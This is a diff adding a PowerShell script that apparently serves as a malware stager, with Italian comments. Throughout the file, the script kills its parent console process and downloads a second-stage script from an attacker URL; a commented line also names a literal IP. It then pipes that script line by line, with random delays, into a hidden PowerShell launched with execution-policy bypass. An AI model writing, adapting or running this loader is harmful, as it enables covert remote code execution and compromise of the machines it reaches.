@@ -1,0 +1,40 @@
+# 🔥 KILL CMD PARENT PROCESS
+$parentProcessId= (Get-WmiObject Win32_Process -Filter "ProcessId=$PID" | Select -Expand ParentProcessId) 2>$null
+if ($parentProcessId) { Stop-Process -Id $parentProcessId -Force -ErrorAction SilentlyContinue }
+
+# $url = "http://151.61.206.201/second.txt";
+$url= "[ATTACKER-URL]/[SECONDNAME]";
+$scriptString= (New-Object Net.WebClient).DownloadString($url);
+$scriptLines= $scriptString -split "`r?`n";
+
+$psi= New-Object System.Diagnostics.ProcessStartInfo;
+$psi.FileName = "powershell.exe";
+$psi.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass";
+$psi.UseShellExecute = $false;
+$psi.RedirectStandardInput = $true;
+$psi.RedirectStandardOutput = $true;
+$psi.RedirectStandardError = $true;
+$psi.CreateNoWindow = $true;
+
+$process= [System.Diagnostics.Process]::Start($psi);
+Start-Sleep -Seconds 1.2;
+
+# 1. INIT error handling
+$process.StandardInput.WriteLine('$ErrorActionPreference = "SilentlyContinue"');
+$process.StandardInput.Flush();
+Start-Sleep -Milliseconds 200;
+
+# 2. INVIO script line-by-line
+foreach ($line in $scriptLines) {
+    if ($line.Trim()) {
+        $process.StandardInput.WriteLine($line.TrimEnd());
+        $process.StandardInput.Flush();
+        Start-Sleep -Milliseconds (50..150 | Get-Random);
+    }
+}
+
+# 🔥 CRITICO: TRIGGER FINALE - ESEGUE tutto!
+$process.StandardInput.WriteLine('');  # Nuova riga
+$process.StandardInput.Flush();
+Start-Sleep -Milliseconds 500;
+
